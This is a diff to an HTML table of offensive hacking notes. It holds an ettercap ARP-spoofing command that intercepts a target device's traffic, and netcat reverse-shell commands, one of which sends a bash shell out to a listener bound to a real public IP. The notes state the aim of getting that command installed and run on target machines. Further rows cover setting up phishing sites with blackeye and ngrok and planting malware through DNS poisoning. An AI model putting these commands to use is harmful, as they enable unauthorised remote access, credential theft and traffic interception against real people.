@@ -433,8 +433,8 @@ $ apt install ettercap-text-only <br />
 $ sudo nmap -sn 10.0.0.0/24 (start scanning the network for ip addresses of devices) <br />
 $ sudo ettercap -T -S i wlan0 -M arp:remote /10.0.0.1// /10.0.0.129//(S = SSL, 10.0.0.1 is router and 10.0.0.129 is the target, then use wireshark to sniff ) <br />
 In wireshark: ip.addr == 10.0.0.129 <br />
-ip.addr == 10.0.0.129 && http (to filter no SSL cert destination ip from target device)
-
+ip.addr == 10.0.0.129 && http (to filter no SSL cert destination ip from target device) <br />
+Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
 <br /></td>
 </tr>
 
@@ -450,6 +450,42 @@ ip.addr == 10.0.0.129 && http (to filter no SSL cert destination ip from target 
 > DHCP server <br />
 > cd /Program Files/Oracle/VirtualBox (In windoows)<br />
 >  >vboxmanage dhcpserver add --network=networkname --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable<br />
+<br /></td>
+</tr>
+
+<tr>
+<th>reverse shells with netcat</th>
+<td>how to get remote access to your hacking targets<br /></td>
+<td>
+$ nc -lnvp 87 -s source_ip (l=listening for a connection, n= no dns, only ip; v=verbose, p=port) <br />
+In the target machine (both machines must have netcat-nc): <br />
+$ nc -e /bin/bash source_ip 87 (port 87) <br />
+We want the above script to be installed in the machine and executed.<br />
+In windows: using [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) <br />
+(server side) $ stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 69.164.204.158 <br />
+(client side) $ command [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)<br />
+<br /></td>
+</tr>
+
+<tr>
+<th>Phishing attacks</th>
+<td>phishing website and emails with [blackeye](https://github.com/An0nUD4Y/blackeye)<br /></td>
+<td>
+$ git clone https://github.com/An0nUD4Y/blackeye <br />
+$ sudo ./blackeye.sh (setup [ngrok](https://ngrok.com/) with auth token )<br />
+Spear Phishing Attack: use SET (Social Engineering Toolkit):<br />
+(put malware - mess host file: DNS Poisoning)
+
+<br /></td>
+</tr>
+
+
+<tr>
+<th>put a DARK WEB website on a Raspberry Pi!!</th>
+<td>host a dark web website<br /></td>
+<td>
+
+
 <br /></td>
 </tr>
 </table>
